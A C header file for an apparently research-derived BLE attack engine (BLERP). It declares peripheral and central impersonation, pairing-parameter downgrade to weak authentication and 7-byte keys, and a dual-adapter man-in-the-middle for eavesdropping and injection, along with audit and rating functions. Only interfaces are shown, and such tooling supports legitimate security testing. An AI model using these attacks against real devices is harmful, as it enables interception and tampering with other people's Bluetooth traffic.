// ========================================
//  nom du fichier: blerp_attack.h
//  description courte: BLERP native attack engine (NDSS 2026).
//  Implements Peripheral Impersonation (PI), Central Impersonation (CI),
//  MitM downgrade proxy, and full V1-V6 vulnerability evaluation.
//  dernière modification : 2026-10-04
//  auteur: GitHub/@gGaToRr
// ========================================

#ifndef BLEURP_BLERP_ATTACK_H
#define BLEURP_BLERP_ATTACK_H

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#include "repair.h"
#include "secreq.h"
#include "smp.h"
#include "smp_legacy.h"

// The six vulnerabilities identified in the BLERP paper (NDSS 2026).
enum blerp_vuln {
    BLERP_V1_UNAUTH_SECREQ = 0,    // Central accepts unauthenticated Security Request
    BLERP_V2_UNAUTH_REPAIR,        // Peripheral accepts unauthenticated Pairing Request on bond
    BLERP_V3_PERIPHERAL_DOWNGRADE, // Peripheral requests high security then downgrades in response
    BLERP_V4_LEVEL_DOWNGRADE,      // Re-pairing proceeds at a lower security level than stored bond
    BLERP_V5_SESSION_BREAK,        // Attacker rejects encryption, victim falls back to re-pairing
    BLERP_V6_ENTROPY_DOWNGRADE,    // Encryption key entropy reduced below stored bond (e.g. 7 bytes)
    BLERP_VULN_COUNT
};

// Attack operation modes.
enum blerp_attack_type {
    BLERP_ATTACK_PI = 0,   // Peripheral Impersonation (spoof peripheral, reject enc, downgrade central)
    BLERP_ATTACK_CI,       // Central Impersonation (spoof central, connect, inject pairing request)
    BLERP_ATTACK_MITM,     // Man-in-the-Middle (dual-adapter active packet tampering & downgrade)
    BLERP_ATTACK_AUDIT,    // Full automated diagnostic of V1-V6 against target
};

// Configuration parameters for BLERP attacks.
struct blerp_attack_config {
    enum blerp_attack_type type;
    int dev_id;                  // Primary HCI device index (e.g. 0 for hci0)
    int dev_id_sec;              // Secondary HCI device index for MitM (e.g. 1 for hci1)
    uint8_t target_addr[6];      // Target device BD_ADDR (LE byte order)
    uint8_t target_type;         // 1 = Public, 2 = Random
    uint8_t spoof_addr[6];       // Address to spoof (LE byte order, all 0 if none)
    uint8_t spoof_type;          // 1 = Public, 2 = Random
    char adv_name[32];           // Advertised device name (for PI and MitM)
    uint16_t appearance;         // BLE Appearance (e.g. 0x03C0 for HID Generic, 0x03C1 Keyboard)
    bool reject_enc;             // V5: Reject Central's encryption request (LL_REJECT_IND)
    bool send_secreq;            // V1/V3: Send SMP Security Request to Central
    uint8_t sec_req_authreq;     // AuthReq byte for Security Request (e.g. 0x0d or with RFU bits)
    uint8_t downgraded_authreq;  // Weak AuthReq forced into Pairing Req/Rsp (e.g. 0x01)
    uint8_t downgraded_keysize;  // Weak key size forced into Pairing Req/Rsp (e.g. 7 bytes)
    int wait_conn_ms;            // Maximum wait time for connection (ms)
    int wait_react_ms;           // Maximum wait time for peer SMP reaction (ms)
    bool allow_sc;                // Complete LE Secure Connections (smp_sc_engine) when the
                                  // peer's Pairing Request has the SC bit set, instead of
                                  // only ever downgrading to Legacy -- needed against a peer
                                  // locked to Secure Connections Only (SCO), which refuses
                                  // Legacy pairing outright. See smp_sc_engine.h's caveats
                                  // before relying on this against real hardware.
};

// Comprehensive attack outcome and vulnerability assessment report.
struct blerp_attack_report {
    enum blerp_verdict verdicts[BLERP_VULN_COUNT];
    char vuln_details[BLERP_VULN_COUNT][128];

    bool connected;              // Link Layer connection established
    bool enc_rejected;           // Encryption request was received and rejected
    bool secreq_sent;            // Security Request was transmitted
    bool preq_received;          // Pairing Request received from peer
    bool pres_sent;              // Pairing Response sent to peer
    bool preq_sent;              // Pairing Request sent to peer (initiator mode)
    bool pres_received;          // Pairing Response received from peer (initiator mode)
    bool pairing_failed;         // Peer issued Pairing Failed (0x05)
    uint8_t fail_reason;         // Error code when pairing failed
    bool phase2_completed;       // SMP Phase 2 (confirm/random/key) finished successfully
    bool sc_used;                // phase2_completed via smp_sc_engine (LTK) rather than
                                  // smp_legacy (STK) -- see cfg->allow_sc
    uint8_t negotiated_authreq;  // Final agreed AuthReq byte
    uint8_t negotiated_keysize;  // Final agreed encryption key size (7..16)
    uint8_t stk[16];             // Derived session key: STK (Legacy) or LTK (SC, sc_used=true)
};

// Return the standard code string for a vulnerability (e.g. "V1", "V2").
const char *blerp_vuln_code(enum blerp_vuln v);

// Return the human-readable title of the vulnerability.
const char *blerp_vuln_title(enum blerp_vuln v);

// Initialize attack configuration with safe and effective defaults.
void blerp_config_init(struct blerp_attack_config *cfg, enum blerp_attack_type type);

// Construct advertising payload containing Flags, Complete Name, and optional Appearance.
// Returns the number of bytes written, or 0 on error.
size_t blerp_build_adv_data(const char *name, uint16_t appearance, uint8_t *out, size_t max);

// Rewrite a 7-byte SMP Pairing Request PDU to force downgraded parameters.
// If forced_authreq != 0, updates the AuthReq field.
// If forced_keysize != 0, clamps max_key_size to forced_keysize.
// Returns 7 on success, or -1 on invalid input.
int blerp_rewrite_preq(const uint8_t in[7], uint8_t out[7],
                       uint8_t forced_authreq, uint8_t forced_keysize);

// Rewrite a 7-byte SMP Pairing Response PDU to force downgraded parameters.
// Returns 7 on success, or -1 on invalid input.
int blerp_rewrite_pres(const uint8_t in[7], uint8_t out[7],
                       uint8_t forced_authreq, uint8_t forced_keysize);

// Pure vulnerability evaluation function: evaluates raw observations against
// the baseline bond (ARPK) and classifies all 6 vulnerabilities V1..V6.
void blerp_classify_vulnerabilities(const struct smp_bond_info *bond,
                                    const struct blerp_attack_report *raw,
                                    struct blerp_attack_report *out);

// Execute a Peripheral Impersonation (PI) attack against a bonded Central.
// Spoofs the peripheral identity, rejects encryption to trigger re-pairing (V5),
// downgrades security parameters (V3/V4/V6), and completes Phase 2 SMP.
int blerp_run_pi(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep);

// Execute a Central Impersonation (CI) attack against a bonded Peripheral.
// Connects to peripheral with spoofed central address, injects an unauthenticated
// Pairing Request (V2), forces downgraded security (V4/V6), and completes Phase 2 SMP.
int blerp_run_ci(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep);

// Execute the BLERP double-channel MitM attack (NDSS 2026, Fig. 1 "double-channel").
// Runs a Peripheral Impersonation attack against the victim Central on the
// primary adapter (cfg->dev_id) concurrently with a Central Impersonation
// attack against the victim Peripheral (cfg->target_addr) on the secondary
// adapter (cfg->dev_id_sec). Each side completes its own independent pairing
// with the attacker (two distinct PKs), which is enough to later eavesdrop,
// drop, modify, or inject messages exchanged between the two victims.
// cfg->target_addr is required: it is both the CI connection target and the
// PI spoofed identity (the attacker must appear as the real Peripheral to the
// Central). cfg->spoof_addr, if set, is the address the CI side spoofs to the
// Peripheral (the real Central's identity). Returns -1 if cfg->target_addr is
// unset, cfg->dev_id == cfg->dev_id_sec, or an adapter could not be used.
int blerp_run_mitm(const struct blerp_attack_config *cfg, struct blerp_attack_report *rep);

// Execute a full automated audit testing V1 to V6 against a target device.
int blerp_run_audit(const struct blerp_attack_config *cfg,
                    const struct smp_bond_info *bond,
                    struct blerp_attack_report *rep);

// Print the formatted attack report and vulnerability verdict matrix to stdout.
void blerp_print_report(const struct blerp_attack_config *cfg,
                        const struct smp_bond_info *bond,
                        const struct blerp_attack_report *rep);

// Overall rating of one target, following the paper's Table I. VULNERABLE as
// soon as one of V1..V6 is confirmed. PROTECTED only with positive evidence:
// the device refuses the unauthenticated re-pairing (V2 = NO). Otherwise
// INCONCLUSIVE. NO_BOND is set by the caller: BLERP needs an existing pairing.
enum blerp_rating {
    BLERP_RATING_VULNERABLE = 0,
    BLERP_RATING_PROTECTED,
    BLERP_RATING_INCONCLUSIVE,
    BLERP_RATING_NO_BOND,
};

// Verdicts for one target, merged over every test run against it.
struct blerp_target_verdict {
    enum blerp_verdict v[BLERP_VULN_COUNT];
    uint8_t refusal; // first Pairing Failed reason seen (0 = none)
};

// Start every verdict as inconclusive: nothing has been observed yet.
void blerp_target_verdict_init(struct blerp_target_verdict *t);

// Fold one run's verdicts into `t`. A YES is never overwritten by a later NO.
void blerp_target_verdict_merge(struct blerp_target_verdict *t,
                                const enum blerp_verdict *v, uint8_t refusal);

// Rating from the merged verdicts. Pure function, safe to unit test.
enum blerp_rating blerp_target_rating(const struct blerp_target_verdict *t);

#endif // BLEURP_BLERP_ATTACK_H
